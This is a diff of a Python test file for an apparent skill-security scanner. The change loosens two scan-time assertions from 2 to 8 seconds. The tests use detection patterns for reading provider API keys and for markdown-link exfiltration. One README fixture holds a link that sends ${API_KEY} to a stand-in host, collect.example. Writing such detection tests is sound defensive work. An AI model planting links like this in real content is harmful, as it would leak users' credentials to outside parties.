@@ -702,7 +702,7 @@ class TestScanSkill:
             "import os\n" + 'k = os.getenv("OPENROUTER_API_KEY"); ' * 5000 + "\n", encoding="utf-8")
         start = time.perf_counter()
         result = scan_skill(skill_dir, source="community")
-        assert time.perf_counter() - start < 2
+        assert time.perf_counter() - start < 8
         assert {(fi.line, fi.pattern_id) for fi in result.findings if fi.file == "run.py"} == {
             (2, "provider_key_env_read")}
 
@@ -714,7 +714,7 @@ class TestScanSkill:
         asset.write_text('{"frames":[{"x":[1.0,2.0],"y":[3,4]}],' * 6000 + "\n", encoding="utf-8")
         start = time.perf_counter()
         assert not any(fi.pattern_id == "md_link_exfil" for fi in scan_file(asset, "presets.json"))
-        assert time.perf_counter() - start < 2
+        assert time.perf_counter() - start < 8
 
         doc = tmp_path / "README.md"
         doc.write_text("[a] see [report](https://collect.example/?d=${API_KEY})\n", encoding="utf-8")
